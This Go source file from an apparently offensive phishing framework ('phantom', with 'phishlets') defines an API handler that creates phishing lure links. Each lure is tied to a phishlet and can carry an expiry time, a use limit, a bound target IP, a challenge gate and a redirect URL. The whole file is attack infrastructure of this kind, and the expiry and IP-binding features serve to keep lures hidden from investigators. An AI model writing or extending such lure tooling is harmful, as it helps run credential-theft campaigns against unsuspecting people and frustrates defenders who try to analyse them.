// Smart Lures API: создание одноразовых/TTL/IP-bound приманок.
package api

import (
	"fmt"
	"time"

	"github.com/phantom-v2/phantom/core"
	"github.com/phantom-v2/phantom/internal/lures"
)

// SmartLureIn — тело POST /api/v1/lures.
type SmartLureIn struct {
	Path             string `json:"path"` // /l/xxxx
	PhishletID       string `json:"phishlet_id"`
	TTLMin           int    `json:"ttl_min"` // 0 = без срока
	MaxUses          int    `json:"max_uses"`
	BoundIP          string `json:"bound_ip"`
	RequireChallenge bool `json:"require_challenge"`
	RedirectURL      string   `json:"redirect_url"`
}

// CreateSmartLure валидирует вход, пишет в стор (персист — через тот же стор в main).
func CreateSmartLure(store core.LureStore, in SmartLureIn) error {	st, ok := store.(*lures.Store)
	if !ok {
		return fmt.Errorf("smart lures unsupported by store")
	}
	var exp time.Time
	if in.TTLMin > 0 {
		exp = time.Now().Add(time.Duration(in.TTLMin) * time.Minute)
	}
	return st.SmartCreate(lures.Smart{
		Path:             in.Path,
		PhishletID:       in.PhishletID,
		ExpiresAt:        exp,
		MaxUses:          in.MaxUses,
		BoundIP:          in.BoundIP,
		RequireChallenge: in.RequireChallenge,
			RedirectURL:      in.RedirectURL,
	})
}
